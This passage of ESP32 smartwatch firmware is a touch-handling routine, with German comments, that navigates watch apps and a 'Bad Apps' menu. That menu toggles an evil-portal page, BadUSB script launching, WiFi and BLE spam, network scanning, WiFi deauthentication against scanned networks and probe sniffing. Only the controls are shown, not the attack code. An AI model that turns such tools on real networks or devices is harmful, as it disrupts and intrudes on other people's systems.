            else if (isGoodApp) slideToPage(22, 0, 1);
            else if (isBadApp) slideToPage(23, 0, 1);
            else slideToPage(6, 0, 1);
            lastTouchTime = millis(); return;
        }
        // --- Swipe back: Good Apps -> Good Menu, Bad Apps -> Bad Menu ---
        // Good: Finger rechts ansetzen, nach links wischen (dx < 0) → zurück zum Good Menu
        // Bad: Finger links ansetzen, nach rechts wischen (dx > 0) → zurück zum Bad Menu
        else if (abs(dx) > 40 && abs(dx) > abs(dy) && isApp) {
            if (isGoodApp && dx < 0) { triggerVibration(); slideToPage(22, -1, 0); lastTouchTime = millis(); return; }
            if (isBadApp && dx > 0) { triggerVibration(); slideToPage(23, 1, 0); lastTouchTime = millis(); return; }
            if (isQSApp) { triggerVibration(); slideToPage(5, (dx > 0) ? 1 : -1, 0); lastTouchTime = millis(); return; }
            // Good Menu (22) -> Übersicht (6): nach links wischen (dx < 0)
            if (currentPage == 22 && dx < 0) { triggerVibration(); slideToPage(6, -1, 0); lastTouchTime = millis(); return; }
            // Bad Menu (23) -> Übersicht (6): nach rechts wischen (dx > 0)
            if (currentPage == 23 && dx > 0) { triggerVibration(); slideToPage(6, 1, 0); lastTouchTime = millis(); return; }
        }
        // --- Swipe UP to kill from Menu Pages 22/23 ---
        else if (dy < -60 && abs(dy) > abs(dx) && (currentPage == 22 || currentPage == 23)) {
            killAllApps(); triggerVibration();
            tft.fillRect(80, 0, 80, 40, TFT_RED);
            tft.setTextDatum(MC_DATUM); tft.setTextColor(TFT_WHITE, TFT_RED);
            tft.drawString("KILL", 120, 20, 2);
            delay(250);
            slideToPage(6, 0, 1);
            lastTouchTime = millis(); return;
        }
        // --- Watchface horizontal swipe ---
        else if (abs(dx) > 40 && abs(dx) > abs(dy)) { 
            if (currentPage >= 0 && currentPage <= 3) { 
                int nextP = currentPage; int checks = 0;
                if (dx > 0) { do { nextP--; if(nextP < 0) nextP = 3; checks++; } while(nextP != currentPage && !isPageEnabled(nextP) && checks < 4); } 
                else { do { nextP++; if(nextP > 3) nextP = 0; checks++; } while(nextP != currentPage && !isPageEnabled(nextP) && checks < 4); }
                if(nextP != currentPage && isPageEnabled(nextP)) { slideToPage(nextP, (dx > 0) ? 1 : -1, 0); mainPage = currentPage; } 
            }
        } 
        else if (dy > 40 && abs(dy) > abs(dx)) { 
            Serial.printf("[TOUCH] Swipe DOWN page=%d -> ziel: %s\n", currentPage, (currentPage >= 0 && currentPage <= 3) ? "5" : (currentPage == 6) ? "main" : "?");
            if (currentPage >= 0 && currentPage <= 3) { slideToPage(5, 0, 1); } else if (currentPage == 6) { slideToPage(mainPage, 0, 1); } 
        } 
        else if (dy < -40 && abs(dy) > abs(dx)) { 
            Serial.printf("[TOUCH] Swipe UP page=%d -> ziel: %s\n", currentPage, (currentPage >= 0 && currentPage <= 3) ? "6" : (currentPage == 5) ? "main" : "?");
            if (currentPage >= 0 && currentPage <= 3) { slideToPage(6, 0, -1); } else if (currentPage == 5) { slideToPage(mainPage, 0, -1); } 
        }
        else if (abs(dx) < 25 && abs(dy) < 25) { 
            int touchY = lastY - 34; 
            if (currentPage == 5) { 
                if (touchY >= 25 && touchY < 65) { if (lastX < 120) { toggleWLAN(); triggerVibration(); lastSecond = -1; } else { toggleBT(); triggerVibration(); lastSecond = -1; } } 
                else if (touchY >= 70 && touchY < 110) { if (lastX < 120) { toggleVibra(); lastSecond = -1; } else { aodActive = !aodActive; prefs.begin("clock",false); prefs.putBool("aod", aodActive); prefs.end(); triggerVibration(); lastSecond = -1; } } 
                else if (touchY >= 115 && touchY < 155) { if (lastX < 120) slideToPage(10, 0, -1); else slideToPage(11, 0, -1); }
                else if (touchY >= 162) { if (lastX < 120) { killAllApps(); triggerVibration(); showToast("Alle Apps gestoppt"); lastSecond = -1; } else { toggleUsbHid(); triggerVibration(); lastSecond = -1; } }
            } 
            else if (currentPage == 6) { 
                if (touchY >= 30 && touchY <= 195) {
                    if (lastX < 120) { 
                        triggerVibration(); slideToPage(22, 1, 0);   // Good=LINKS: kommt von links
                    } else { 
                        triggerVibration(); slideToPage(23, -1, 0);  // Bad=RECHTS: kommt von rechts
                    }
                }
            }
            // === Menu-Page Taps (erst beim Loslassen, damit Swipe-Back funktioniert) ===
            else if (currentPage == 22) { handleGoodMenuTouch(lastX, touchY); }
            else if (currentPage == 23) { handleBadMenuTouch(lastX, touchY); }
            // === App-Page Taps (nur bei echtem Tap, nicht bei Swipe) ===
            else if (currentPage == 7) { 
                if (touchY >= 150) {
                    if (lastX < 80) {
                        // Start/Stop
                        swRunning = !swRunning; triggerVibration();
                        if(swRunning) swStartTime = millis(); else swElapsed += (millis() - swStartTime);
                    } else if (lastX < 160 && swRunning && swLapCount < MAX_LAPS) {
                        // Runde
                        long lapMs = swElapsed + (millis() - swStartTime);
                        swLaps[swLapCount++] = lapMs;
                        triggerVibration();
                    } else if (lastX >= 160) {
                        // Reset
                        swRunning = false; swElapsed = 0; swLapCount = 0;
                        triggerVibration();
                    }
                    lastSecond = -1; delay(200);
                }
            } else if (currentPage == 8) { 
                if (!timerRunning) { if (touchY >= 80 && touchY <= 130) { if (lastX < 80) timerRemaining = t1 * 60; else if (lastX < 160) timerRemaining = t2 * 60; else timerRemaining = t3 * 60; timerRunning = true; timerLastTick = millis(); triggerVibration(); lastSecond = -1; delay(200); } } 
                else { if (touchY >= 150) { timerRunning = false; timerRemaining = 0; triggerVibration(); lastSecond = -1; delay(200); } }
            } else if (currentPage == 12) { handleEvilTouch(lastX, touchY);
            } else if (currentPage == 13) { handleRechnerTouch(lastX, touchY);
            } else if (currentPage == 14) { handleJigglerTouch(lastX, touchY);
            } else if (currentPage == 15) { 
                if (touchY >= 25 && touchY <= 75) {
                    if (lastX > 10 && lastX < 70) { currentBadUsbScript--; if(currentBadUsbScript < 0) currentBadUsbScript = 2; triggerVibration(); lastSecond = -1; delay(200); }
                    else if (lastX > 170 && lastX < 230) { currentBadUsbScript++; if(currentBadUsbScript > 2) currentBadUsbScript = 0; triggerVibration(); lastSecond = -1; delay(200); }
                }
                else if (touchY >= 85 && touchY <= 135 && lastX > 50 && lastX < 190) { badUsbActive = !badUsbActive; triggerVibration(); lastSecond = -1; delay(200); }
            } else if (currentPage == 16) { 
                if (touchY >= 80 && touchY <= 130 && lastX > 55 && lastX < 185) {
                    wifiSpamActive = !wifiSpamActive; triggerVibration(); lastSecond = -1; delay(200);
                    if(wifiSpamActive) { WiFi.mode(WIFI_AP); esp_wifi_set_promiscuous(true); } 
                    else { esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); }
                }
            } else if (currentPage == 17) { 
                if (touchY >= 80 && touchY <= 130 && lastX > 55 && lastX < 185) {
                    bleSpamActive = !bleSpamActive; triggerVibration(); lastSecond = -1; delay(200);
                    if (!bleSpamActive && bleInitDone && !btActive) { BLEDevice::deinit(true); bleInitDone = false; }
                }
            } else if (currentPage == 18) { 
                if (touchY >= 25 && touchY <= 75) {
                    if (lastX > 10 && lastX < 70) { currentTargetNmap--; if(currentTargetNmap < 0) currentTargetNmap = 2; triggerVibration(); lastSecond = -1; delay(200); }
                    else if (lastX > 170 && lastX < 230) { currentTargetNmap++; if(currentTargetNmap > 2) currentTargetNmap = 0; triggerVibration(); lastSecond = -1; delay(200); }
                }
                else if (touchY >= 85 && touchY <= 125 && lastX > 50 && lastX < 190) {
                    if (targetSSIDs[currentTargetNmap].length() > 0) {
                        nmapActive = !nmapActive; 
                        if(nmapActive) { nmapState = 0; } else { WiFi.disconnect(true); WiFi.mode(WIFI_OFF); }
                        triggerVibration(); lastSecond = -1; delay(200);
                    }
                }
            } else if (currentPage == 19) { 
                if (touchY >= 25 && touchY <= 75) {
                    if (lastX > 10 && lastX < 70) { currentDeauthTarget--; if(currentDeauthTarget < 0) currentDeauthTarget = numScannedNetworks > 0 ? numScannedNetworks - 1 : 0; triggerVibration(); lastSecond = -1; delay(200); }
                    else if (lastX > 170 && lastX < 230) { currentDeauthTarget++; if(currentDeauthTarget >= numScannedNetworks) currentDeauthTarget = 0; triggerVibration(); lastSecond = -1; delay(200); }
                }
                else if (touchY >= 75 && touchY <= 110 && lastX > 50 && lastX < 190) {
                    if (numScannedNetworks > 0) {
                        deauthActive = !deauthActive; 
                        if(deauthActive) { deauthState = 0; } else { esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); }
                        triggerVibration(); lastSecond = -1; delay(200);
                    }
                }
                else if (touchY >= 125 && touchY <= 155 && lastX > 60 && lastX < 180) {
                    isScanningAir = true; triggerVibration(); lastSecond = -1; delay(200);
                }
            } else if (currentPage == 20) {
                if (touchY >= 145 && touchY <= 185 && lastX > 40 && lastX < 200) {
                    if (probeMonActive) stopProbeMonitor(); else startProbeMonitor();
                    triggerVibration(); lastSecond = -1; delay(200);
                } else if (touchY >= 0 && touchY < 60) {
                    if (probeScrollOffset > 0) { probeScrollOffset--; lastSecond = -1; }
                } else if (touchY >= 100 && touchY < 140) {
                    // Liste zeigt 4 Zeilen -> max. Offset ist probeCount-4 (sonst leere Slots)
                    if (probeScrollOffset < probeCount - 4) { probeScrollOffset++; lastSecond = -1; }
                }
            } else if (currentPage == 21) {
                if (touchY >= 145 && touchY <= 185 && lastX > 40 && lastX < 200) {
                    if (bleScanActive) stopBleScan(); else startBleScan();
                    triggerVibration(); lastSecond = -1; delay(200);
                } else if (touchY >= 0 && touchY < 60) {
                    if (bleScanScrollOffset > 0) { bleScanScrollOffset--; lastSecond = -1; }
                } else if (touchY >= 100 && touchY < 140) {
                    // Liste zeigt 4 Zeilen -> max. Offset ist bleScanCount-4 (sonst leere Slots)
                    if (bleScanScrollOffset < bleScanCount - 4) { bleScanScrollOffset++; lastSecond = -1; }
                }
            } else if (currentPage == 24) { handleDiceTouch(lastX, touchY);
            }
            lastTouchTime = millis();
        }
    }
}